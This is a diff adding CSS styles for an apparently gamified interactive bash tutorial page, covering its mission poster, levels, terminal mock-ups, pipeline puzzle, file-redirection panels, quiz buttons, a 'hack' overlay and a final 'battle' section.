+.ix-bash .bs-mission{position:relative;margin:24px 0 0;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--yel);display:grid;grid-template-columns:1fr 1fr;overflow:hidden}
+.ix-bash .bs-poster{position:relative;min-height:440px;overflow:hidden;background:#0b0b0b;border-right:3px solid var(--yel);display:flex;flex-direction:column;justify-content:center;padding:28px 22px 96px;isolation:isolate}
+.ix-bash .bs-pdots{position:absolute;inset:0;z-index:-1;background-image:radial-gradient(rgba(255,214,10,.55) 1.4px,transparent 2.2px);background-size:9px 9px;-webkit-mask-image:radial-gradient(circle at 75% 30%,#000 0,transparent 70%);mask-image:radial-gradient(circle at 75% 30%,#000 0,transparent 70%)}
+.ix-bash .bs-pname{display:block;font-family:var(--f-mono);font-size:clamp(40px,7vw,58px);line-height:.95;color:var(--yel);letter-spacing:-.02em;text-shadow:5px 5px 0 #000,6px 6px 0 rgba(255,59,59,.9)}
+.ix-bash .bs-pline{display:flex;align-items:center;gap:14px;margin-top:26px;font-family:var(--code);font-weight:800;font-size:clamp(20px,3.4vw,28px);line-height:1}
+.ix-bash .bs-pc{font-style:normal;color:rgba(255,255,255,.55)}
+.ix-bash .bs-pb{font-style:normal;color:var(--red);text-shadow:0 0 18px rgba(255,59,59,.8)}
+.ix-bash .bs-pipe{flex:0 0 22px;height:96px;background:var(--yel);background-image:repeating-linear-gradient(-45deg,var(--ink) 0 7px,transparent 7px 16px);border:3px solid var(--yel);box-shadow:0 0 26px rgba(255,214,10,.7)}
+.ix-bash .bs-tape{position:absolute;left:-20%;right:-20%;bottom:44px;transform:rotate(-6deg);background:var(--yel);color:var(--ink);border-top:4px solid var(--ink);border-bottom:4px solid var(--ink);box-shadow:0 0 0 3px var(--yel);overflow:hidden;white-space:nowrap;font-family:var(--code);font-weight:800;font-size:16px;line-height:1;padding:9px 0}
+.ix-bash .bs-tape span{display:inline-block;padding-left:0}
+.ix-bash .bs-ptag{position:absolute;left:14px;top:14px;font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--yel);padding:5px 10px;border:2px solid var(--yel)}
+.ix-bash .bs-mbody{padding:28px 26px;display:flex;flex-direction:column;gap:18px;justify-content:center}
+.ix-bash .bs-kick{font-family:var(--f-cap);font-size:14px;letter-spacing:.12em;color:var(--yel)}
+.ix-bash .bs-mt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:46px;line-height:1;color:var(--yel);text-transform:uppercase}
+.ix-bash .bs-msub{font-size:20px;line-height:1.4}
+.ix-bash .bs-msub em{font-style:normal;color:var(--ink);background:var(--yel);padding:0 5px}
+.ix-bash .bs-motto{font-family:var(--f-hand);font-size:22px;line-height:1.2;color:#ffb3b3}
+.ix-bash .bs-moves{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
+.ix-bash .bs-moves li{border:2px solid #fff;padding:7px 6px 8px}
+.ix-bash .bs-moves b{display:block;font-family:var(--f-mono);font-weight:400;font-size:19px;color:var(--ink);-webkit-text-stroke:1.5px var(--yel)}
+.ix-bash .bs-moves span{display:block;font-family:var(--f-cap);font-size:13px;line-height:1.15;margin-top:4px}
+.ix-bash .bs-moves li.bs-x{border-color:var(--yel);background:rgba(255,214,10,.18)}
+.ix-bash .bs-go{align-self:flex-start;min-height:56px;padding:0 26px;font-family:var(--f-cap);font-size:20px;background:var(--yel);color:var(--ink);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--red);cursor:pointer;transition:transform .12s,box-shadow .12s}
+.ix-bash .bs-go:hover{transform:translate(-2px,-2px);box-shadow:7px 7px 0 var(--red)}
+.ix-bash .bs-go:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--red)}
+.ix-bash.bs-anim .bs-tape span{animation:ix-bash-marq 14s linear infinite}
+.ix-bash.bs-anim .bs-pipe{animation:ix-bash-pipeglow 2.4s ease-in-out infinite}
+.ix-bash.bs-anim .bs-go:not(:disabled){animation:ix-bash-pulse 1.8s ease-in-out infinite}
+
+/* LEVELS */
+.ix-bash .bs-lvl{position:relative;margin-top:48px;border:3px solid var(--ink);background:#fffdf6;box-shadow:6px 6px 0 var(--ink);scroll-margin-top:56px}
+.ix-bash .bs-lh{display:flex;flex-wrap:wrap;align-items:center;gap:8px 12px;padding:14px 18px;border-bottom:3px solid var(--ink);background:var(--yel)}
+.ix-bash .bs-lh-v{background:var(--ink);color:var(--yel)}
+.ix-bash .bs-lh-v .bs-ln{background:var(--yel);color:var(--ink)}
+.ix-bash .bs-ln{font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--yel);padding:4px 10px}
+.ix-bash .bs-lt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:24px;line-height:1.15}
+.ix-bash .bs-ok{display:none;margin-left:auto;font-family:var(--f-cap);font-size:13px;color:var(--ink);background:var(--green);border:2px solid var(--ink);padding:3px 10px;transform:rotate(2deg)}
+.ix-bash .bs-clear .bs-ok{display:inline-block}
+.ix-bash .bs-lb{padding:22px 20px 24px}
+.ix-bash .bs-locked{pointer-events:none;user-select:none}
+.ix-bash .bs-locked .bs-lb{filter:grayscale(1) blur(3px);opacity:.35;max-height:260px;overflow:hidden}
+.ix-bash .bs-lockcap{display:none}
+.ix-bash .bs-locked .bs-lockcap{display:grid;position:absolute;inset:56px 0 0;place-items:center;z-index:5}
+.ix-bash .bs-lockcap span{font-family:var(--f-cap);font-size:16px;background:var(--ink);color:#fff;padding:10px 16px}
+.ix-bash .bs-after{display:none;margin-top:30px;padding-top:26px;border-top:3px dashed rgba(20,20,20,.25)}
+.ix-bash .bs-lvl.bs-clear .bs-after{display:block;animation:ix-bash-up .4s ease-out}
+.ix-bash .bs-part{margin-top:24px;animation:ix-bash-up .4s ease-out}
+
+.ix-bash .bs-say{display:flex;gap:10px;align-items:flex-start;margin:0 0 16px}
+.ix-bash .bs-who{flex:0 0 auto;font-family:var(--f-cap);font-size:12px;background:var(--ink);color:#fff;padding:3px 8px;margin-top:8px;white-space:nowrap}
+.ix-bash .bs-who.bs-son{background:#fff;color:var(--ink);border:2px solid var(--ink)}
+.ix-bash .bs-bub{font-family:var(--f-hand);font-size:23px;line-height:1.22;background:#fff;border:3px solid var(--ink);border-radius:16px;padding:7px 14px;box-shadow:3px 3px 0 var(--ink);min-width:0}
+.ix-bash .bs-bub b{font-family:var(--f-text);font-weight:700;font-size:.85em}
+.ix-bash .bs-bub code{font-size:.72em;background:rgba(255,214,10,.5);padding:0 4px;overflow-wrap:anywhere}
+
+/* terminal */
+.ix-bash .bs-term{margin:20px 0 0;border:3px solid var(--ink);background:var(--ink);color:var(--tx);box-shadow:5px 5px 0 var(--yel);overflow:hidden}
+.ix-bash .bs-tbar{display:flex;align-items:center;gap:6px;padding:8px 12px;background:#2a2a2a;border-bottom:2px solid #000}
+.ix-bash .bs-tbar span{width:11px;height:11px;border-radius:50%;background:#555}
+.ix-bash .bs-tbar span:first-child{background:var(--red)}
+.ix-bash .bs-tbar span:nth-child(2){background:var(--yel)}
+.ix-bash .bs-tbar b{margin-left:8px;font-family:var(--f-cap);font-weight:400;font-size:13px;color:#bdb6a4}
+.ix-bash .bs-tbody{padding:16px 16px 18px;font-family:var(--code);font-size:17px;line-height:1.5;min-height:64px}
+.ix-bash .bs-tbody p{overflow-wrap:anywhere}
+.ix-bash .bs-cmd{font-family:var(--code);font-weight:700;font-size:19px;overflow-wrap:anywhere}
+.ix-bash .bs-ps{color:var(--yel);font-weight:700}
+.ix-bash .bs-cur{display:inline-block;width:.6em;height:1.05em;vertical-align:-3px;background:var(--yel);margin-left:3px}
+.ix-bash.bs-anim .bs-cur{animation:ix-bash-blink 1s steps(1) infinite}
+.ix-bash .bs-shell{margin-top:16px;font-family:var(--f-cap);font-size:15px;color:var(--yel)}
+.ix-bash .bs-words{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px}
+.ix-bash .bs-wd{display:flex;flex-direction:column;gap:4px;padding:8px 10px;border:2px solid #fff;background:#222;min-width:0;max-width:100%}
+.ix-bash .bs-wd code{font-size:20px;font-weight:800;color:#fff;overflow-wrap:anywhere}
+.ix-bash .bs-wd small{font-family:var(--f-text);font-size:15px;line-height:1.25;color:#d8d2c2}
+.ix-bash .bs-wd-c{border-color:var(--yel)}.ix-bash .bs-wd-c code{color:var(--yel)}
+.ix-bash .bs-wd-f{border-color:#9bd3ff}.ix-bash .bs-wd-f code{color:#9bd3ff}
+.ix-bash .bs-wd-bad{border-color:var(--red);background:#3a1414}.ix-bash .bs-wd-bad code{color:#ff8a8a}.ix-bash .bs-wd-bad small{color:#ffc2c2}
+.ix-bash .bs-wd-good{border-color:var(--green);background:#0f2a1f}.ix-bash .bs-wd-good code{color:var(--green)}
+.ix-bash.bs-anim .bs-words .bs-wd{animation:ix-bash-pop .45s cubic-bezier(.2,1.6,.4,1) both}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(2){animation-delay:.12s}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(3){animation-delay:.24s}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(4){animation-delay:.36s}
+.ix-bash .bs-out{margin-top:14px;font-size:22px;font-weight:800;color:#fff}
+.ix-bash .bs-dim{color:#8f897a}
+.ix-bash .bs-err{color:#ff8a8a}
+.ix-bash .bs-good{color:var(--green)}
+
+.ix-bash .bs-act{margin-top:20px;display:flex;flex-wrap:wrap;gap:12px}
+.ix-bash .bs-btn{min-height:52px;padding:0 22px;font-family:var(--f-cap);font-size:18px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--yel);cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:transform .1s,box-shadow .1s;text-align:center;line-height:1.2}
+.ix-bash .bs-btn:hover{transform:translate(-1px,-1px);box-shadow:5px 5px 0 var(--yel)}
+.ix-bash .bs-btn:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--yel)}
+.ix-bash .bs-btn.bs-y{background:var(--yel);color:var(--ink);box-shadow:4px 4px 0 var(--ink)}
+.ix-bash .bs-btn.bs-y:hover{box-shadow:5px 5px 0 var(--ink)}
+.ix-bash .bs-btn:disabled{opacity:.4;cursor:default;transform:none}
+.ix-bash .bs-pair .bs-btn{flex:1 1 150px}
+.ix-bash .bs-legal{margin-top:14px;font-size:16px;color:var(--muted)}
+.ix-bash .bs-note{margin-top:18px;font-size:18px;line-height:1.45;border-left:5px solid var(--yel);padding:2px 0 2px 14px}
+.ix-bash .bs-def{margin-top:18px;font-size:18px;line-height:1.5}
+.ix-bash .bs-q{margin:26px 0 12px;font-family:var(--f-cap);font-size:22px;line-height:1.25}
+.ix-bash .bs-cnt{display:inline-block;margin-left:6px;font-family:var(--f-mono);font-size:18px;background:var(--ink);color:var(--yel);padding:2px 8px;vertical-align:2px}
+.ix-bash .bs-choices{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.ix-bash .bs-choices.bs-two-ch{grid-template-columns:1fr 1fr}
+.ix-bash .bs-ch{min-height:88px;padding:12px 14px;border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;gap:4px;transition:transform .1s,box-shadow .1s}
+.ix-bash .bs-ch:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-ch:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--ink)}
+.ix-bash .bs-ch b{font-family:var(--f-cap);font-weight:400;font-size:19px;line-height:1.2}
+.ix-bash .bs-ch b code{font-size:20px;background:none;padding:0}
+.ix-bash .bs-ch span{font-size:16px;line-height:1.35;color:#3b372e}
+.ix-bash .bs-ch.bs-ch-v{border-color:var(--rdk)}
+.ix-bash .bs-ch.bs-wrong{background:#ffe1e1;border-color:var(--rdk);opacity:.7;cursor:default}
+.ix-bash .bs-ch.bs-wrong b{text-decoration:line-through}
+.ix-bash .bs-ch.bs-right{background:var(--green)}
+.ix-bash .bs-ch.bs-right span{color:var(--ink)}
+.ix-bash .bs-ch:disabled{cursor:default;transform:none}
+.ix-bash .bs-fb{margin-top:14px;font-size:18px;line-height:1.4}
+.ix-bash .bs-fb:empty{display:none}
+.ix-bash .bs-fb b{font-family:var(--f-cap);font-weight:400;margin-right:6px}
+.ix-bash .bs-fb.bs-bad b{color:var(--rdk)}
+.ix-bash .bs-fb.bs-good b{color:var(--gdk)}
+.ix-bash .bs-two{display:grid;gap:16px}
+.ix-bash .bs-two p{display:flex;gap:14px;align-items:flex-start;font-size:19px;line-height:1.38}
+.ix-bash .bs-two b{display:block;font-family:var(--f-cap);font-weight:400;font-size:24px;line-height:1.15;margin-bottom:2px}
+.ix-bash .bs-mk{flex:0 0 48px;height:48px;display:grid;place-items:center;border:3px solid var(--ink);background:#fff;font-family:var(--code);font-size:26px;font-weight:800;line-height:1}
+.ix-bash .bs-mk-y{background:var(--ink);color:var(--yel)}
+.ix-bash .bs-big{font-family:var(--f-mono);font-size:28px;line-height:1.18;margin-bottom:22px}
+.ix-bash .bs-big span{color:var(--rdk)}
+.ix-bash .bs-big .bs-ip{display:inline-block;font-family:var(--code);font-weight:800;font-size:1.25em;color:var(--ink);background:var(--yel);padding:2px 10px;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);margin-bottom:8px}
+
+/* PIPELINE (WOW) */
+.ix-bash .bs-goal{margin:4px 0 0;font-size:19px}
+.ix-bash .bs-goal b{font-family:var(--f-cap);font-weight:400}
+.ix-bash .bs-pipe-w{margin-top:20px;display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,1fr);gap:18px;align-items:start}
+.ix-bash .bs-stages{list-style:none;margin:0;padding:0;display:grid;gap:22px}
+.ix-bash .bs-st{position:relative;display:grid;grid-template-columns:minmax(0,1fr) auto;align-items:center;gap:4px 10px;padding:10px 12px 12px;background:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink)}
+.ix-bash .bs-st::before{content:"";position:absolute;left:26px;top:-25px;height:22px;width:var(--win,24px);transform:translateX(-50%);background:var(--yel);background-image:repeating-linear-gradient(to bottom,var(--ink) 0 4px,transparent 4px 9px);border-left:3px solid var(--ink);border-right:3px solid var(--ink);transition:width .5s}
+.ix-bash .bs-st:first-child::before{display:none}
+.ix-bash.bs-anim .bs-st::before{animation:ix-bash-flow .45s linear infinite}
+.ix-bash .bs-stc code{display:block;font-size:17px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ix-bash .bs-stn{font-family:var(--f-cap);font-size:14px;color:var(--muted);white-space:nowrap;text-align:right}
+.ix-bash .bs-stn b{font-family:var(--f-mono);font-weight:400;font-size:19px;color:var(--ink)}
+.ix-bash .bs-stbar{grid-column:1/-1;height:12px;background:#ece6d6;border:2px solid var(--ink);position:relative;overflow:hidden}
+.ix-bash .bs-stbar i{position:absolute;inset:0 auto 0 0;width:var(--p,100%);min-width:4px;background:var(--yel);border-right:2px solid var(--ink);transition:width .7s cubic-bezier(.3,1.3,.5,1)}
+.ix-bash .bs-st.bs-new{animation:ix-bash-drop2 .45s cubic-bezier(.2,1.4,.4,1)}
+.ix-bash .bs-st.bs-zero{border-color:var(--rdk);background:#ffe9e9}
+.ix-bash .bs-st.bs-zero .bs-stn b{color:var(--rdk)}
+.ix-bash .bs-st.bs-win{background:var(--yel)}
+.ix-bash .bs-ocol{position:sticky;top:60px;min-width:0}
+.ix-bash .bs-screen{border:3px solid var(--ink);background:var(--ink);color:var(--tx);box-shadow:5px 5px 0 var(--yel);overflow:hidden}
+.ix-bash .bs-scrv{position:relative;height:262px;overflow:hidden;padding:10px 12px;font-family:var(--code);font-size:14px;line-height:1.5}
+.ix-bash .bs-scrv pre{margin:0;font:inherit;white-space:pre;overflow:hidden}
+.ix-bash .bs-fall{will-change:transform}
+.ix-bash.bs-anim .bs-fall{animation:ix-bash-fall 9s linear infinite}
+.ix-bash .bs-scrv.bs-many::after{content:"";position:absolute;left:0;right:0;bottom:0;height:60px;background:linear-gradient(transparent,var(--ink))}
+.ix-bash .bs-more{position:absolute;z-index:2;right:10px;bottom:8px;font-family:var(--f-cap);font-size:13px;color:var(--ink);background:var(--yel);padding:3px 8px}
+.ix-bash .bs-scrv .bs-hl{display:block;color:var(--ink);background:var(--yel);font-weight:800;margin:0 -12px;padding:4px 12px;font-size:17px}
+.ix-bash.bs-anim .bs-scrv .bs-hl{animation:ix-bash-glow 1.4s ease-in-out infinite}
+.ix-bash .bs-found{display:inline-block;margin-top:12px;font-family:var(--f-mono);font-size:22px;color:var(--ink);background:var(--yel);border:3px solid #fff;padding:4px 12px;transform:rotate(-4deg)}
+.ix-bash.bs-anim .bs-found{animation:ix-bash-stamp .5s cubic-bezier(.2,1.6,.4,1) both}
+.ix-bash .bs-empty{color:#ff8a8a;font-family:var(--f-cap);font-size:16px}
+.ix-bash .bs-line{margin-top:20px;padding:12px 14px;background:var(--ink);color:#fff;font-family:var(--code);font-size:16px;line-height:1.5;border:3px solid var(--ink);overflow-wrap:anywhere}
+.ix-bash .bs-line code{font-size:16px;background:none;color:#fff}
+.ix-bash .bs-line .bs-pp{color:var(--yel);font-weight:800}
+.ix-bash .bs-trayt{margin-top:22px;font-family:var(--f-cap);font-size:18px}
+.ix-bash .bs-tray{margin-top:10px;display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px}
+.ix-bash .bs-blk{min-height:76px;padding:10px 10px 9px;border:3px solid var(--ink);background:var(--yel);box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;justify-content:space-between;gap:4px;transition:transform .1s,box-shadow .1s,opacity .2s}
+.ix-bash .bs-blk code{font-size:16px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.ix-bash .bs-blk span{font-size:14px;line-height:1.25;color:#3b372e}
+.ix-bash .bs-blk:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-blk:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--ink)}
+.ix-bash .bs-blk:disabled{background:#ece6d6;opacity:.45;box-shadow:none;transform:none;cursor:default}
+.ix-bash .bs-hint{margin:16px 0 0}
+.ix-bash .bs-scrv.bs-won{height:auto;min-height:150px;padding-bottom:16px}
+.ix-bash .bs-hint .bs-bub{min-height:52px}
+
+/* L3 IO */
+.ix-bash .bs-io{margin-top:6px;display:grid;grid-template-columns:minmax(0,1.2fr) minmax(0,1fr);gap:16px;align-items:start}
+.ix-bash .bs-io-b{font-size:15px;min-height:150px}
+.ix-bash .bs-io-b p{white-space:pre-wrap}
+.ix-bash .bs-files{display:grid;gap:12px;margin-top:20px}
+.ix-bash .bs-file{border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);transition:background .3s}
+.ix-bash .bs-fname{display:flex;align-items:center;gap:8px;padding:6px 10px;border-bottom:2px solid var(--ink);background:#ece6d6;font-family:var(--code);font-weight:800;font-size:15px}
+.ix-bash .bs-fname::before{content:"";width:12px;height:15px;border:2px solid var(--ink);background:#fff;clip-path:polygon(0 0,65% 0,100% 30%,100% 100%,0 100%)}
+.ix-bash .bs-fbody{margin:0;min-height:44px;padding:8px 10px;font-family:var(--code);font-size:13.5px;line-height:1.45;white-space:pre-wrap;overflow-wrap:anywhere;color:var(--ink)}
+.ix-bash .bs-fbody:empty::before{content:"пусто";color:#9d9785;font-family:var(--f-text)}
+.ix-bash .bs-fbody i{font-style:normal;color:var(--muted);font-family:var(--f-cap);font-size:12px}
+.ix-bash .bs-file.bs-fl{background:#fff4b0}
+.ix-bash .bs-file.bs-wipe{background:#ffe1e1;animation:ix-bash-shake .4s}
+.ix-bash .bs-iocap{margin-top:16px;font-size:18px;line-height:1.45}
+.ix-bash .bs-iocap:empty{display:none}
+.ix-bash .bs-iocap b{font-family:var(--f-cap);font-weight:400}
+.ix-bash .bs-redir{list-style:none;margin:0;padding:0;display:grid;gap:12px}
+.ix-bash .bs-redir li{display:flex;align-items:center;gap:14px;font-size:19px;line-height:1.3}
+.ix-bash .bs-redir code{flex:0 0 64px;text-align:center;font-size:22px;font-weight:800;background:var(--ink);color:var(--yel);padding:6px 0;border-radius:0}
+
+/* L4 */
+.ix-bash .bs-post{position:relative;border:3px solid var(--ink);background:var(--ink);color:#fff;padding:16px 16px 18px;box-shadow:5px 5px 0 var(--red);background-image:radial-gradient(rgba(255,214,10,.12) 1.3px,transparent 1.9px);background-size:11px 11px}
+.ix-bash .bs-ph{display:flex;align-items:center;gap:12px;margin-bottom:12px}
+.ix-bash .bs-ph b{display:block;font-family:var(--f-cap);font-weight:400;font-size:19px;color:var(--yel)}
+.ix-bash .bs-ph small{display:block;font-size:14px;color:#bdb6a4}
+.ix-bash .bs-av,.ix-bash .bs-bface{flex:0 0 auto;display:grid;place-items:center;width:52px;height:52px;border-radius:50%;background:var(--yel);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.85) 0 5px,transparent 5px 11px);border:3px solid var(--yel);font-family:var(--f-mono);font-size:30px;line-height:1;color:var(--yel);text-shadow:0 0 0 #000,-2px 0 #000,2px 0 #000,0 -2px #000,0 2px #000}
+.ix-bash .bs-pt{font-family:var(--f-hand);font-size:23px;line-height:1.22}
+.ix-bash .bs-magic{display:block;margin-top:14px;padding:12px 14px;background:#000;color:var(--yel);border:2px dashed var(--yel);font-size:17px;font-weight:800;line-height:1.4;overflow-wrap:anywhere}
+.ix-bash .bs-script{margin-top:6px;border:3px solid var(--ink);background:var(--ink);box-shadow:5px 5px 0 var(--yel);padding:8px 0}
+.ix-bash .bs-sl{display:flex;gap:10px;width:100%;min-height:44px;align-items:center;padding:6px 12px;background:transparent;border:0;border-left:5px solid transparent;color:var(--tx);text-align:left;cursor:pointer;font-family:var(--code);font-size:15px;line-height:1.4}
+.ix-bash .bs-sl:hover{background:#262626}
+.ix-bash .bs-sl i{flex:0 0 18px;font-style:normal;color:#6f6a5c;font-size:13px;text-align:right}
+.ix-bash .bs-sl code{font-size:15px;font-weight:600;overflow-wrap:anywhere;min-width:0}
+.ix-bash .bs-sl.bs-flag{background:rgba(255,59,59,.24);border-left-color:var(--red)}
+.ix-bash .bs-sl.bs-flag code{color:#ffc2c2}
+.ix-bash .bs-sl.bs-fine{border-left-color:#555}
+.ix-bash .bs-sl.bs-fine code{color:#9d9785}
+.ix-bash .bs-rule{margin:22px 0 0;font-family:var(--f-cap);font-size:22px;line-height:1.3;background:var(--ink);color:#fff;padding:14px 16px;border-left:8px solid var(--red)}
+.ix-bash .bs-rule code{background:var(--yel);color:var(--ink)}
+.ix-bash .bs-why{margin:20px 0 0;padding:0;list-style:none;display:grid;gap:16px;counter-reset:bswhy}
+.ix-bash .bs-why li{position:relative;padding-left:46px;font-size:18px;line-height:1.45;counter-increment:bswhy}
+.ix-bash .bs-why li::before{content:counter(bswhy);position:absolute;left:0;top:0;width:32px;height:32px;display:grid;place-items:center;background:var(--red);color:#fff;font-family:var(--f-cap);font-size:17px}
+.ix-bash .bs-why b{font-family:var(--f-cap);font-weight:400;font-size:20px}
+
+/* L5 */
+.ix-bash .bs-code{margin:6px 0 0;padding:14px 16px;background:var(--ink);color:var(--tx);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel);font-family:var(--code);font-size:15px;line-height:1.6;white-space:pre;overflow-x:auto}
+.ix-bash .bs-cm{color:#9d9785}
+.ix-bash .bs-cl-hi{color:var(--yel);font-weight:800}
+.ix-bash .bs-qv{color:var(--green)}
+.ix-bash .bs-codecap{margin:14px 0 22px;font-size:17px;line-height:1.45;color:#3b372e}
+.ix-bash .bs-qdemo{margin-top:4px;padding:16px;background:var(--ink);color:var(--tx);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel)}
+.ix-bash .bs-qset{display:block;font-size:16px;color:#bdb6a4;margin-bottom:8px;overflow-wrap:anywhere}
+.ix-bash .bs-cmd-big{font-size:22px}
+.ix-bash .bs-qnote{margin-top:14px;font-size:18px;line-height:1.4;color:#fff}
+.ix-bash .bs-qnote:empty{display:none}
+.ix-bash .bs-qnote b{font-family:var(--f-cap);font-weight:400;color:var(--yel)}
+.ix-bash .bs-cron{display:block;margin-top:4px;padding:14px 16px;background:var(--yel);border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);font-size:20px;font-weight:800;overflow-wrap:anywhere}
+
+/* HACK overlay */
+.ix-bash .bs-hack{position:fixed;inset:0;z-index:1000;display:grid;place-items:center;padding:16px;overflow:auto;background:#d81818;color:#fff;background-image:radial-gradient(rgba(20,20,20,.32) 1.6px,transparent 2.4px);background-size:10px 10px}
+.ix-bash .bs-hkin{max-width:560px;width:100%;display:flex;flex-direction:column;align-items:center;gap:18px;text-align:center}
+.ix-bash .bs-hkt{font-family:var(--f-mono);font-size:68px;line-height:1;color:var(--yel);-webkit-text-stroke:3px var(--ink);paint-order:stroke fill;text-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-hkterm{width:100%;text-align:left;background:var(--ink);border:3px solid var(--ink);box-shadow:6px 6px 0 var(--yel);padding:14px 16px;font-family:var(--code);font-size:15px;line-height:1.55;transform:rotate(-1deg)}
+.ix-bash .bs-hkterm p{overflow-wrap:anywhere;color:#bdb6a4}
+.ix-bash .bs-hkterm .bs-ok-l{color:var(--green)}
+.ix-bash .bs-hkterm .bs-bad-l{color:#ff8a8a;font-weight:700}
+.ix-bash .bs-hkpl{margin:0;background:var(--ink);padding:10px 18px;border:3px solid var(--ink);box-shadow:5px 5px 0 var(--yel);transform:rotate(2deg)}
+.ix-bash .bs-hkpl .bs-pipe{height:60px}
+.ix-bash .bs-hksay{font-family:var(--f-hand);font-size:26px;line-height:1.15;background:#fff;color:var(--ink);border:3px solid var(--ink);border-radius:16px;padding:6px 16px}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkin{animation:ix-bash-hackin .5s cubic-bezier(.2,1.5,.4,1)}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p{animation:ix-bash-type .3s steps(1) both}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(2){animation-delay:.25s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(3){animation-delay:.5s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(4){animation-delay:.75s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(5){animation-delay:1s}
+.ix-bash.bs-anim .bs-hack:not([hidden]) .bs-hkterm p:nth-child(6){animation-delay:1.25s}
+.ix-bash.bs-anim .bs-hack.bs-rw{animation:ix-bash-fade .6s ease-in forwards}
+.ix-bash.bs-anim .bs-hack.bs-rw .bs-hkin{animation:ix-bash-rewind .6s ease-in forwards}
+
+/* BATTLE */
+.ix-bash .bs-battle{margin-top:72px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--yel);scroll-margin-top:16px;outline:none}
+.ix-bash .bs-bh{display:flex;align-items:center;gap:16px;padding:18px 20px;border-bottom:3px solid #333}
+.ix-bash .bs-bface{width:84px;height:84px;font-size:46px;text-shadow:-3px 0 #000,3px 0 #000,0 -3px #000,0 3px #000}
+.ix-bash .bs-bface.bs-ow{animation:ix-bash-shake .4s}
+.ix-bash .bs-bhx{flex:1;min-width:0;display:grid;gap:10px}
+.ix-bash .bs-bt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:26px;line-height:1.1;color:var(--yel)}
+.ix-bash .bs-hp{position:relative;height:30px;border:3px solid #fff;background:#2a2a2a;overflow:hidden}
+.ix-bash .bs-hp i{position:absolute;inset:0 auto 0 0;width:100%;background:var(--red);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.2) 0 6px,transparent 6px 12px)}
+.ix-bash .bs-hp b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:14px;text-shadow:0 0 3px #000,0 0 2px #000}
+.ix-bash .bs-bbody{position:relative;padding:22px 20px 26px}
+.ix-bash .bs-mvn{font-family:var(--f-cap);font-size:14px;color:var(--yel);margin-bottom:10px}
+.ix-bash .bs-vsay{font-family:var(--f-hand);font-size:25px;line-height:1.2;background:#fff;color:var(--ink);border:3px solid var(--ink);border-radius:16px;padding:10px 16px;box-shadow:4px 4px 0 var(--yel);margin-bottom:22px}
+.ix-bash .bs-vsay code{font-size:.7em;background:rgba(255,214,10,.55);padding:0 4px;overflow-wrap:anywhere}
+.ix-bash .bs-bq{font-family:var(--f-cap);font-size:19px;margin-bottom:12px}
+.ix-bash .bs-bopts{display:grid;gap:10px}
+.ix-bash .bs-bo{min-height:60px;padding:12px 16px;border:3px solid #fff;background:transparent;color:#fff;cursor:pointer;text-align:left;font-size:18px;line-height:1.3;transition:background .15s}
+.ix-bash .bs-bo code{background:rgba(255,255,255,.14);padding:0 4px}
+.ix-bash .bs-bo:hover{background:#262626}
+.ix-bash .bs-bo.bs-wrong{border-color:#ff8a8a;color:#ffb3b3;text-decoration:line-through;cursor:default}
+.ix-bash .bs-bo.bs-right{background:var(--green);border-color:var(--green);color:var(--ink)}
+.ix-bash .bs-bo:disabled{cursor:default}
+.ix-bash .bs-bfb{margin-top:16px;font-size:18px;line-height:1.4}
+.ix-bash .bs-bfb b{font-family:var(--f-mono);font-weight:400;font-size:24px;display:block;margin-bottom:2px}
+.ix-bash .bs-bfb.bs-good b{color:var(--green)}
+.ix-bash .bs-bfb.bs-bad b{color:#ff8a8a}
